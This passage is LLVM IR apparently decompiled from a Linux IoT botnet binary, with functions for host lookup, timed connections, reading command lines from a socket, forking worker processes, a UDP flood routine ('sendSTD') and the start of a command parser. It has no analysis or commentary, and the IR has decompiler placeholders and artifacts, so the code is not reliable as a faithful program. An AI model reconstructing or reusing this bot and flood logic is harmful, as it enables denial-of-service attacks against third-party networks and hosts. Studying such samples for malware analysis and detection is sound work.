  uselistorder i32 %stack_var_-12.0.in20, { 0, 2, 1 }
  uselistorder i32 %v5_80488ba, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 2, 1, 0, 5, 4, 3, 6, 7, 8 }
  uselistorder i32 %v1_8048889, { 2, 1, 0 }
  uselistorder i32 %v4_8048871, { 0, 2, 3, 1, 4, 5 }
  uselistorder i8* %tmp8, { 1, 0 }
  uselistorder label %dec_label_pc_80488f3, { 1, 0 }
  uselistorder label %dec_label_pc_80488eb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80488c5, { 1, 0 }
  uselistorder label %dec_label_pc_8048892, { 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8048936 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048936, i32* %arg2, align 4
  %v10_804894a = icmp eq i32 %v1_8048936, -1
  %. = zext i1 %v10_804894a to i32
  ret i32 %.
}

define i32 @recvLine() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048967 = load i32, i32* @edi, align 4
  store i32 %v0_8048967, i32* %stack_var_-8, align 4
  %v1_8048974 = inttoptr i32 %tmp17 to i8*
  %v1_8048979 = and i32 %tmp17, -256
  store i32 %v1_8048979, i32* %eax.global-to-local, align 4
  %v5_804897b = call i8* @_memset(i8* %v1_8048974, i32 %v1_8048979, i32 %tmp18)
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804899b = ptrtoint i32* %stack_var_-168 to i32
  %tmp34 = bitcast i32* %stack_var_-168 to i8*
  store i1 false, i1* @df, align 1
  %v5_80489a2 = call i8* @_memset(i8* %tmp34, i32 0, i32 32)
  %v2_80489af = udiv i32 %tmp13, 32
  %v1_80489b5 = urem i32 %tmp13, 32
  store i32 %v1_80489b5, i32* %eax.global-to-local, align 4
  %v0_80489b8 = load i32, i32* @ebp, align 4
  %v2_80489b8 = mul nuw nsw i32 %v2_80489af, 4
  %v3_80489b8 = add nsw i32 %v2_80489b8, -164
  %v4_80489b8 = add i32 %v3_80489b8, %v0_80489b8
  %v5_80489b8 = inttoptr i32 %v4_80489b8 to i32*
  %v6_80489b8 = load i32, i32* %v5_80489b8, align 4
  %v9_80489b8 = shl i32 1, %v1_80489b5
  %v12_80489b8 = or i32 %v6_80489b8, %v9_80489b8
  store i32 %v12_80489b8, i32* %v5_80489b8, align 4
  %v1_80489c3 = add i32 %tmp13, 1
  %v2_80489c7 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_804899b, i32* %eax.global-to-local, align 4
  %v5_80489df = call i32 @__libc_select(i32 %v1_80489c3, i32 %v2_804899b, i32 0, i32 %v2_804899b, i32 %v2_80489c7)
  store i32 %v5_80489df, i32* %eax.global-to-local, align 4
  %tmp35 = icmp slt i32 %v5_80489df, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_8048a6e, label %dec_label_pc_8048a68.preheader

dec_label_pc_8048a68.preheader:                   ; preds = %entry
  %v7_8048a6c43 = icmp sgt i32 %tmp9, 9
  br i1 %v7_8048a6c43, label %dec_label_pc_8048a6e, label %dec_label_pc_80489f2

dec_label_pc_80489f2:                             ; preds = %dec_label_pc_8048a68.preheader, %dec_label_pc_8048a65
  %stack_var_-36.044 = phi i32 [ %v4_8048a65, %dec_label_pc_8048a65 ], [ %tmp9, %dec_label_pc_8048a68.preheader ]
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v5_8048a17 = call i8* @_memset(i8* %tmp34, i32 0, i32 32)
  store i32 %v1_80489b5, i32* %eax.global-to-local, align 4
  %v0_8048a2d = load i32, i32* @ebp, align 4
  %v4_8048a2d = add i32 %v3_80489b8, %v0_8048a2d
  %v5_8048a2d = inttoptr i32 %v4_8048a2d to i32*
  %v6_8048a2d = load i32, i32* %v5_8048a2d, align 4
  %v12_8048a2d = or i32 %v6_8048a2d, %v9_80489b8
  store i32 %v12_8048a2d, i32* %v5_8048a2d, align 4
  store i32 %v2_804899b, i32* %eax.global-to-local, align 4
  %v5_8048a54 = call i32 @__libc_select(i32 %v1_80489c3, i32 %v2_804899b, i32 0, i32 %v2_804899b, i32 %v2_80489c7)
  store i32 %v5_8048a54, i32* %eax.global-to-local, align 4
  %tmp37 = icmp slt i32 %v5_8048a54, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8048a6e, label %dec_label_pc_8048a65

dec_label_pc_8048a65:                             ; preds = %dec_label_pc_80489f2
  %v4_8048a65 = add nsw i32 %stack_var_-36.044, 1
  %v7_8048a6c = icmp sgt i32 %stack_var_-36.044, 8
  br i1 %v7_8048a6c, label %dec_label_pc_8048a6e, label %dec_label_pc_80489f2

dec_label_pc_8048a6e:                             ; preds = %dec_label_pc_8048a68.preheader, %dec_label_pc_80489f2, %dec_label_pc_8048a65, %entry
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v2_8048a86 = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_8048ac8

dec_label_pc_8048a7d:                             ; preds = %dec_label_pc_8048ac8
  %v0_8048a7d = load i32, i32* @global_var_8052308.15, align 8
  store i32 %v0_8048a7d, i32* %eax.global-to-local, align 4
  %v4_8048a8e = call i32 @__libc_recv(i32 %v0_8048a7d, i32 %v2_8048a86, i32 1, i32 0)
  store i32 %v4_8048a8e, i32* %eax.global-to-local, align 4
  %v9_8048a96 = icmp eq i32 %v4_8048a8e, 1
  br i1 %v9_8048a96, label %dec_label_pc_8048aad, label %dec_label_pc_8048a9b

dec_label_pc_8048a9b:                             ; preds = %dec_label_pc_8048a7d
  %v4_8048a9b = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 %v4_8048a9b, i32* %eax.global-to-local, align 4
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_8048ae5

dec_label_pc_8048aad:                             ; preds = %dec_label_pc_8048a7d
  %v3_8048aad = load i8, i8* %stack_var_-177, align 1
  %v4_8048aad = sext i8 %v3_8048aad to i32
  store i32 %v4_8048aad, i32* %eax.global-to-local, align 4
  %v4_8048ab3 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_8048aad, i8* %stack_var_-32.0, align 1
  %v5_8048ab8 = add i32 %v4_8048ab3, 1
  %v22_8048ab8 = inttoptr i32 %v5_8048ab8 to i8*
  %v3_8048abb = load i8, i8* %stack_var_-177, align 1
  %v4_8048abb = sext i8 %v3_8048abb to i32
  %v6_8048abb = load i32, i32* %eax.global-to-local, align 4
  %v7_8048abb = and i32 %v6_8048abb, -256
  %v8_8048abb = or i32 %v7_8048abb, %v4_8048abb
  store i32 %v8_8048abb, i32* %eax.global-to-local, align 4
  %v10_8048ac1 = icmp eq i8 %v3_8048abb, 10
  br i1 %v10_8048ac1, label %dec_label_pc_8048ad6, label %dec_label_pc_8048ac5

dec_label_pc_8048ac5:                             ; preds = %dec_label_pc_8048aad
  %v4_8048ac5 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8048ac8

dec_label_pc_8048ac8:                             ; preds = %dec_label_pc_8048a6e, %dec_label_pc_8048ac5
  %v7_8048acc = phi i32 [ %tmp17, %dec_label_pc_8048a6e ], [ %v8_8048abb, %dec_label_pc_8048ac5 ]
  %stack_var_-32.0 = phi i8* [ %v1_8048974, %dec_label_pc_8048a6e ], [ %v22_8048ab8, %dec_label_pc_8048ac5 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048a6e ], [ %v4_8048ac5, %dec_label_pc_8048ac5 ]
  %stack_var_12.0 = phi i32 [ %tmp18, %dec_label_pc_8048a6e ], [ %v4_8048ac8, %dec_label_pc_8048ac5 ]
  %v4_8048ac8 = add i32 %stack_var_12.0, -1
  %v9_8048ac8 = sub i32 0, %stack_var_12.0
  %v10_8048ac8 = and i32 %stack_var_12.0, %v9_8048ac8
  %v11_8048ac8 = icmp slt i32 %v10_8048ac8, 0
  %v12_8048ac8 = icmp eq i32 %v4_8048ac8, 0
  %v13_8048ac8 = icmp slt i32 %v4_8048ac8, 0
  %v3_8048acc = icmp eq i1 %v13_8048ac8, %v11_8048ac8
  %v4_8048acc = icmp eq i1 %v12_8048ac8, false
  %v5_8048acc = and i1 %v4_8048acc, %v3_8048acc
  %v6_8048acc = zext i1 %v5_8048acc to i32
  %v8_8048acc = and i32 %v7_8048acc, -256
  %v9_8048acc = or i32 %v6_8048acc, %v8_8048acc
  store i32 %v9_8048acc, i32* %eax.global-to-local, align 4
  %v4_8048ad2 = icmp eq i1 %v5_8048acc, false
  %v1_8048ad4 = icmp eq i1 %v4_8048ad2, false
  br i1 %v1_8048ad4, label %dec_label_pc_8048a7d, label %dec_label_pc_8048ad6

dec_label_pc_8048ad6:                             ; preds = %dec_label_pc_8048aad, %dec_label_pc_8048ac8
  %stack_var_-32.1 = phi i8* [ %v22_8048ab8, %dec_label_pc_8048aad ], [ %stack_var_-32.0, %dec_label_pc_8048ac8 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  store i32 %stack_var_-28.0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8048ae5

dec_label_pc_8048ae5:                             ; preds = %dec_label_pc_8048a9b, %dec_label_pc_8048ad6
  %storemerge = phi i32 [ -1, %dec_label_pc_8048a9b ], [ %stack_var_-28.0, %dec_label_pc_8048ad6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v3_8048aeb = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048aeb, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048ac8, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 2, 0, 1, 3, 4 }
  uselistorder i8* %v22_8048ab8, { 1, 0 }
  uselistorder i32 %v1_80489b5, { 2, 1, 0 }
  uselistorder i32 %v2_804899b, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 3, 1, 2 }
  uselistorder i32 %tmp13, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_8048ae5, { 1, 0 }
  uselistorder label %dec_label_pc_8048ad6, { 1, 0 }
  uselistorder label %dec_label_pc_8048ac8, { 1, 0 }
  uselistorder label %dec_label_pc_8048a6e, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80489f2, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_8048af3 = load i32, i32* @edi, align 4
  %v3_8048b04 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8048b0f = or i32 %v3_8048b04, 2048
  %v3_8048b21 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8048b0f)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_8048b32 = urem i32 %arg3, 65536
  %v1_8048b3b = call i32 @htons(i32 %v1_8048b32)
  store i32 %arg2, i32* @edx, align 4
  %v3_8048b55 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8048b5d = icmp eq i32 %v3_8048b55, 0
  br i1 %v1_8048b5d, label %dec_label_pc_8048b70, label %dec_label_pc_8048b61

dec_label_pc_8048b61:                             ; preds = %entry
  br label %dec_label_pc_8048cad

dec_label_pc_8048b70:                             ; preds = %entry
  %v2_8048b4d = ptrtoint i32* %stack_var_-40 to i32
  %v3_8048b8f = call i32 @__libc_connect(i32 %arg1, i32 %v2_8048b4d, i32 16)
  %v5_8048b9a = icmp slt i32 %v3_8048b8f, 0
  %v1_8048b9e = icmp eq i1 %v5_8048b9a, false
  br i1 %v1_8048b9e, label %dec_label_pc_8048c74, label %dec_label_pc_8048ba4

dec_label_pc_8048ba4:                             ; preds = %dec_label_pc_8048b70
  %v1_8048ba4 = call i32 @__errno_location(i32 %v3_8048b8f)
  %v1_8048ba9 = inttoptr i32 %v1_8048ba4 to i32*
  %v2_8048ba9 = load i32, i32* %v1_8048ba9, align 4
  %v9_8048bab = icmp eq i32 %v2_8048ba9, 115
  %v1_8048bae = icmp eq i1 %v9_8048bab, false
  br i1 %v1_8048bae, label %dec_label_pc_8048c68, label %dec_label_pc_8048bb4

dec_label_pc_8048bb4:                             ; preds = %dec_label_pc_8048ba4
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8048bd1 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8048bd1, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8048bd8 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_8048be5 = udiv i32 %arg1, 32
  %v1_8048beb = urem i32 %arg1, 32
  %v0_8048bee = load i32, i32* @ebp, align 4
  %v2_8048bee = mul nuw nsw i32 %v2_8048be5, 4
  %v3_8048bee = add nsw i32 %v2_8048bee, -164
  %v4_8048bee = add i32 %v3_8048bee, %v0_8048bee
  %v5_8048bee = inttoptr i32 %v4_8048bee to i32*
  %v6_8048bee = load i32, i32* %v5_8048bee, align 4
  %v9_8048bee = shl i32 1, %v1_8048beb
  %v12_8048bee = or i32 %v6_8048bee, %v9_8048bee
  store i32 %v12_8048bee, i32* %v5_8048bee, align 4
  %v1_8048bf9 = add i32 %arg1, 1
  %v2_8048bfd = ptrtoint i32* %stack_var_-176 to i32
  %v5_8048c10 = call i32 @__libc_select(i32 %v1_8048bf9, i32 0, i32 %v2_8048bd1, i32 0, i32 %v2_8048bfd)
  %tmp33 = icmp slt i32 %v5_8048c10, 1
  br i1 %tmp33, label %dec_label_pc_8048c5c, label %dec_label_pc_8048c1c

dec_label_pc_8048c1c:                             ; preds = %dec_label_pc_8048bb4
  store i32 4, i32* %stack_var_-180, align 4
  %v2_8048c29 = ptrtoint i32* %stack_var_-180 to i32
  %v2_8048c30 = ptrtoint i32* %stack_var_-184 to i32
  %v5_8048c3e = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_8048c30, i32 %v2_8048c29)
  %v3_8048c46 = load i32, i32* %stack_var_-184, align 4
  %v1_8048c4c = icmp eq i32 %v3_8048c46, 0
  br i1 %v1_8048c4c, label %dec_label_pc_8048c74, label %dec_label_pc_8048c50

dec_label_pc_8048c50:                             ; preds = %dec_label_pc_8048c1c
  br label %dec_label_pc_8048cad

dec_label_pc_8048c5c:                             ; preds = %dec_label_pc_8048bb4
  br label %dec_label_pc_8048cad

dec_label_pc_8048c68:                             ; preds = %dec_label_pc_8048ba4
  br label %dec_label_pc_8048cad

dec_label_pc_8048c74:                             ; preds = %dec_label_pc_8048c1c, %dec_label_pc_8048b70
  %v3_8048c7e = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8048c89 = and i32 %v3_8048c7e, -2049
  %v3_8048c9b = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8048c89)
  br label %dec_label_pc_8048cad

dec_label_pc_8048cad:                             ; preds = %dec_label_pc_8048c68, %dec_label_pc_8048c5c, %dec_label_pc_8048c50, %dec_label_pc_8048b61, %dec_label_pc_8048c74
  %v3_8048cad = phi i32 [ 0, %dec_label_pc_8048c68 ], [ 0, %dec_label_pc_8048c5c ], [ 0, %dec_label_pc_8048c50 ], [ 0, %dec_label_pc_8048b61 ], [ 1, %dec_label_pc_8048c74 ]
  store i32 %v0_8048af3, i32* @edi, align 4
  ret i32 %v3_8048cad

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 2, 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8048cad, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8048cbb = load i32, i32* @ebx, align 4
  store i32 %v0_8048cbb, i32* %stack_var_-8, align 4
  %v1_8048cbf = call i32 @__libc_fork(i32 %v0_8048cbb)
  %v4_8048cc7 = icmp eq i32 %v1_8048cbf, 0
  %v1_8048ccb = icmp eq i1 %v4_8048cc7, false
  br i1 %v1_8048ccb, label %dec_label_pc_8048cd8, label %dec_label_pc_8048ccd

dec_label_pc_8048ccd:                             ; preds = %entry
  br label %dec_label_pc_8048dbc

dec_label_pc_8048cd8:                             ; preds = %entry
  %v0_8048cd8 = load i32, i32* @global_var_8052300.16, align 256
  %v0_8048cdd = load i32, i32* @global_var_8052304.17, align 4
  %v1_8048ce3 = add i32 %v0_8048cd8, 1
  %v5_8048ce3 = icmp eq i32 %v0_8048cd8, -1
  %v2_8048ce6 = zext i1 %v5_8048ce3 to i32
  %v3_8048ce6 = add i32 %v2_8048ce6, %v0_8048cdd
  store i32 %v1_8048ce3, i32* @global_var_8052300.16, align 256
  store i32 %v3_8048ce6, i32* @global_var_8052304.17, align 4
  %v2_8048d03 = mul i32 %v1_8048ce3, 4
  %v1_8048d06 = add i32 %v2_8048d03, 4
  %v1_8048d0d = call i32 @malloc(i32 %v1_8048d06)
  br label %dec_label_pc_8048d43

dec_label_pc_8048d21:                             ; preds = %dec_label_pc_8048d43, %dec_label_pc_8048d74
  %v2_8048d24 = mul i32 %storemerge1, 4
  %v5_8048d29 = add i32 %v2_8048d24, %v1_8048d0d
  %v0_8048d34 = load i32, i32* @global_var_8054564.18, align 4
  %v2_8048d39 = add i32 %v0_8048d34, %v2_8048d24
  %v1_8048d3c = inttoptr i32 %v2_8048d39 to i32*
  %v2_8048d3c = load i32, i32* %v1_8048d3c, align 4
  %v2_8048d3e = inttoptr i32 %v5_8048d29 to i32*
  store i32 %v2_8048d3c, i32* %v2_8048d3e, align 4
  %v4_8048d40 = add i32 %storemerge1, 1
  br label %dec_label_pc_8048d43

dec_label_pc_8048d43:                             ; preds = %dec_label_pc_8048cd8, %dec_label_pc_8048d21
  %storemerge1 = phi i32 [ %v4_8048d40, %dec_label_pc_8048d21 ], [ 0, %dec_label_pc_8048cd8 ]
  %v0_8048d51 = load i32, i32* @global_var_8052300.16, align 256
  %v0_8048d56 = load i32, i32* @global_var_8052304.17, align 4
  %v4_8048d60 = icmp ne i32 %v0_8048d51, 0
  %v2_8048d63 = zext i1 %v4_8048d60 to i32
  %v3_8048d63 = add i32 %v0_8048d56, -1
  %v4_8048d63 = add i32 %v3_8048d63, %v2_8048d63
  store i32 %v4_8048d63, i32* @ebx, align 4
  %v10_8048d6f = icmp eq i32 %v4_8048d63, 0
  br i1 %v10_8048d6f, label %dec_label_pc_8048d74, label %dec_label_pc_8048d21

dec_label_pc_8048d74:                             ; preds = %dec_label_pc_8048d43
  %v1_8048d60 = add i32 %v0_8048d51, -1
  %v10_8048d7f = icmp ult i32 %storemerge1, %v1_8048d60
  br i1 %v10_8048d7f, label %dec_label_pc_8048d21, label %dec_label_pc_8048d84

dec_label_pc_8048d84:                             ; preds = %dec_label_pc_8048d74
  %v2_8048d8f = mul i32 %v0_8048d51, 4
  %v5_8048d92 = add i32 %v1_8048d0d, -4
  %v1_8048d95 = add i32 %v5_8048d92, %v2_8048d8f
  store i32 %v1_8048d95, i32* @edx, align 4
  %v2_8048d9b = inttoptr i32 %v1_8048d95 to i32*
  store i32 %v1_8048cbf, i32* %v2_8048d9b, align 4
  %v0_8048d9d = load i32, i32* @global_var_8054564.18, align 4
  %v1_8048da6 = call i32 @free(i32 %v0_8048d9d)
  store i32 %v1_8048d0d, i32* @global_var_8054564.18, align 4
  store i32 %v1_8048cbf, i32* @ecx, align 4
  br label %dec_label_pc_8048dbc

dec_label_pc_8048dbc:                             ; preds = %dec_label_pc_8048ccd, %dec_label_pc_8048d84
  %v3_8048dbf = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048dbf, i32* @ebx, align 4
  ret i32 %v1_8048cbf

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8048d24, { 1, 0 }
  uselistorder i32 %v1_8048d0d, { 2, 0, 1 }
  uselistorder i32 %v0_8048cd8, { 1, 0 }
  uselistorder label %dec_label_pc_8048dbc, { 1, 0 }
  uselistorder label %dec_label_pc_8048d43, { 1, 0 }
  uselistorder label %dec_label_pc_8048d21, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i16 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v4_8048dca = add i32 %arg4, -4096
  %v6_8048dca = sub i32 4095, %arg4
  %v7_8048dca = and i32 %v6_8048dca, %arg4
  %v8_8048dca = icmp slt i32 %v7_8048dca, 0
  %v9_8048dca = icmp eq i32 %v4_8048dca, 0
  %v10_8048dca = icmp slt i32 %v4_8048dca, 0
  %v3_8048dd1 = icmp eq i1 %v10_8048dca, %v8_8048dca
  %v4_8048dd1 = icmp eq i1 %v9_8048dca, false
  %v5_8048dd1 = and i1 %v4_8048dd1, %v3_8048dd1
  br i1 %v5_8048dd1, label %dec_label_pc_8048f33, label %dec_label_pc_8048dd7

dec_label_pc_8048dd7:                             ; preds = %entry
  %v3_8048de0 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_8048df0 = call i32 @__GI_time(i32* null)
  %v1_8048e02 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_8048e0d = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_8048e2e = add i32 %v1_8048e02, 12
  %v2_8048e2e = inttoptr i32 %v1_8048e2e to i32*
  %v3_8048e2e = load i32, i32* %v2_8048e2e, align 4
  %v2_8048e36 = ptrtoint i32* %stack_var_-40 to i32
  %v1_8048e3c = add i32 %v1_8048e02, 16
  %v2_8048e3c = inttoptr i32 %v1_8048e3c to i32*
  %v3_8048e3c = load i32, i32* %v2_8048e3c, align 4
  %v1_8048e3f = inttoptr i32 %v3_8048e3c to i32*
  %v2_8048e3f = load i32, i32* %v1_8048e3f, align 4
  %v3_8048e47 = call i32 @bcopy(i32 %v2_8048e3f, i32 %v2_8048e36, i32 %v3_8048e2e)
  %v1_8048e52 = add i32 %v1_8048e02, 8
  %v2_8048e52 = inttoptr i32 %v1_8048e52 to i32*
  %v3_8048e52 = load i32, i32* %v2_8048e52, align 4
  store i32 %v3_8048e52, i32* %stack_var_-44, align 4
  %v2_8048ea0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8048ea7 = bitcast i32* %stack_var_-76 to i8*
  %v5_8048ef7 = add i32 %v2_8048df0, %arg3
  br label %dec_label_pc_8048e67

dec_label_pc_8048e67:                             ; preds = %dec_label_pc_8048f2b, %dec_label_pc_8048dd7
  %storemerge = phi i32 [ %v4_8048f2b, %dec_label_pc_8048f2b ], [ 0, %dec_label_pc_8048dd7 ]
  %tmp27 = icmp ult i32 %storemerge, 50
  br i1 %tmp27, label %dec_label_pc_8048f2b, label %dec_label_pc_8048e71

dec_label_pc_8048e71:                             ; preds = %dec_label_pc_8048e67
  %v2_8048e76 = call i32 @__GI_time(i32* null)
  store i32 %v2_8048e76, i32* @eax, align 4
  %v1_8048e82 = call i32 @srand(i32 %v2_8048e76)
  %v0_8048e8a = call i32 @rand_init()
  %v0_8048e8f = call i32 @rand_next()
  %v1_8048e94 = mul i32 %v0_8048e8f, 4
  %v2_8048e97 = and i32 %v1_8048e94, 12
  %v1_8048e9a = add nuw nsw i32 %v2_8048e97, 12
  store i32 %v2_8048ea0, i32* @eax, align 4
  %v3_8048ea7 = call i32 @rand_alphastr(i8* %v2_8048ea7, i32 %v1_8048e9a)
  %v0_8048eb2 = load i32, i32* @ebp, align 4
  %v2_8048eb2 = add nsw i32 %v2_8048e97, -60
  %v3_8048eb2 = add i32 %v2_8048eb2, %v0_8048eb2
  %v4_8048eb2 = inttoptr i32 %v3_8048eb2 to i8*
  store i8 0, i8* %v4_8048eb2, align 1
  %v4_8048ec9 = call i32 @__libc_send(i32 %v3_8048de0, i32 %v2_8048ea0, i32 %arg4, i32 0)
  %v3_8048edd = call i32 @__libc_connect(i32 %v3_8048de0, i32 %v2_8048e0d, i32 16)
  %v2_8048eea = call i32 @__GI_time(i32* null)
  %v5_8048efc = icmp slt i32 %v2_8048eea, %v5_8048ef7
  br i1 %v5_8048efc, label %dec_label_pc_8048f2b, label %dec_label_pc_8048efe

dec_label_pc_8048efe:                             ; preds = %dec_label_pc_8048e71
  %v1_8048f04 = call i32 @__libc_close(i32 %v3_8048de0)
  %v1_8048f12 = call i32 @free(i32 %v2_8048ea0)
  %v1_8048f1f = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8048f2b:                             ; preds = %dec_label_pc_8048e71, %dec_label_pc_8048e67
  %stack_var_-16.0 = phi i32 [ %storemerge, %dec_label_pc_8048e67 ], [ 0, %dec_label_pc_8048e71 ]
  %v4_8048f2b = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_8048e67

dec_label_pc_8048f33:                             ; preds = %entry
  %v0_8048f34 = load i32, i32* @eax, align 4
  ret i32 %v0_8048f34

; uselistorder directives
  uselistorder i32 %v2_8048e97, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v4_8048dca, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
}

define i32 @processCmd() local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8048f38 = load i32, i32* @edi, align 4
  %v0_8048f39 = load i32, i32* @esi, align 4
  %v0_8048f3a = load i32, i32* @ebx, align 4
  store i32 %v0_8048f3a, i32* %stack_var_-16, align 4
  %v5_8048f3b = icmp ult i32* %stack_var_-16, inttoptr (i32 76 to i32*)
  store i1 %v5_8048f3b, i1* %cf.global-to-local, align 1
  %v1_8048f41 = inttoptr i32 %tmp31 to i32*
  %v2_8048f41 = load i32, i32* %v1_8048f41, align 4
  store i1 false, i1* @df, align 1
  %v4_8048f55 = inttoptr i32 %v2_8048f41 to i8*
  store i32 %v2_8048f41, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_804fd1c.19 to i32), i32* @edi, align 4
  %v7_8048f5e = call i32 @_strncmp(i8* %v4_8048f55, i8* bitcast (i8** @global_var_804fd1c.19 to i8*), i32 2)
  %v8_8048f5e = urem i32 %v7_8048f5e, 2
  %v9_8048f5e = icmp eq i32 %v8_8048f5e, 0
  %v0_8048f60 = load i1, i1* %cf.global-to-local, align 1
  %v2_8048f60 = or i1 %v0_8048f60, %v9_8048f5e
  %v3_8048f60 = zext i1 %v2_8048f60 to i32
  %v4_8048f60 = load i32, i32* @edx, align 4
  %v5_8048f60 = and i32 %v4_8048f60, -256
  %v6_8048f60 = or i32 %v3_8048f60, %v5_8048f60
  %v7_8048f60 = xor i32 %v6_8048f60, 1
  store i32 %v7_8048f60, i32* @edx, align 4
  %v1_8048f68 = trunc i32 %v7_8048f60 to i8
  %v3_8048f68 = zext i1 %v0_8048f60 to i8
  %v4_8048f68 = sub nsw i8 %v1_8048f68, %v3_8048f68
  %v15_8048f68 = icmp eq i8 %v4_8048f68, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048f71 = icmp eq i1 %v15_8048f68, false
  br i1 %v1_8048f71, label %dec_label_pc_804906e, label %dec_label_pc_8048f77

dec_label_pc_8048f77:                             ; preds = %entry
  %v2_8048f6c = sext i8 %v4_8048f68 to i32
  %v9_8048f77 = icmp ult i32 %tmp27, 4
  store i1 %v9_8048f77, i1* %cf.global-to-local, align 1
  %v7_8048f7b = icmp sgt i32 %tmp27, 4
  br i1 %v7_8048f7b, label %dec_label_pc_8048f81, label %dec_label_pc_8049149

dec_label_pc_8048f81:                             ; preds = %dec_label_pc_8048f77
  %v1_8048f84 = add i32 %tmp31, 4
  %v1_8048f87 = inttoptr i32 %v1_8048f84 to i32*
  %v2_8048f87 = load i32, i32* %v1_8048f87, align 4
  %v1_8048f8f = add i32 %tmp31, 8
  %v1_8048f92 = inttoptr i32 %v1_8048f8f to i32*
  %v2_8048f92 = load i32, i32* %v1_8048f92, align 4
  %v0_8048f94 = load i32, i32* @esp, align 4
